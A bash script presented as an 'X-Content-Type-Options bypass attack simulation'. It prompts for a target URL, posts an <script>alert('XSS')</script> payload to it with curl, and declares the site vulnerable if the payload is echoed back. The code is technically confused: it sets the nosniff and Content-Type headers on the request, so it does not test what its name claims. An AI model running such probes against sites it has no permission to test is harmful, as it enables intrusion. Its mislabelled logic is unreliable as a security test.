#!/bin/bash
# This is a comment

# Color codes
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Function to perform X-Content-Type-Options Bypass Attack Simulation
simulate_x_content_type_options_bypass() {
    echo -e "${GREEN}Simulating X-Content-Type-Options Bypass Attack...${NC}"
    # Serve a file with a misleading Content-Type header
    response=$(curl -s -H "Content-Type: text/plain" -H "X-Content-Type-Options: nosniff" -d "<script>alert('XSS')</script>" "$target_url")

    # Check if response contains the injected script
    if [[ "$response" == *"<script>alert('XSS')</script>"* ]]; then
        echo -e "${RED}Vulnerability confirmed!${NC}"
        echo "--------------------------------------------------"
        echo "To test the vulnerability, try accessing the URL in a web browser and observe if it executes the injected script."
        echo "Example: $target_url"
    else
        echo "No vulnerability detected."
    fi
}

# Main function
main() {
    echo -e "${GREEN}X-Content-Type-Options Bypass Attack Simulation Tool${NC}"
    echo "--------------------------------------------------"

    # Prompt user for target URL
    read -p "Enter your target URL: " target_url

    # Perform X-Content-Type-Options Bypass Attack Simulation
    simulate_x_content_type_options_bypass
}

# Call main function
main
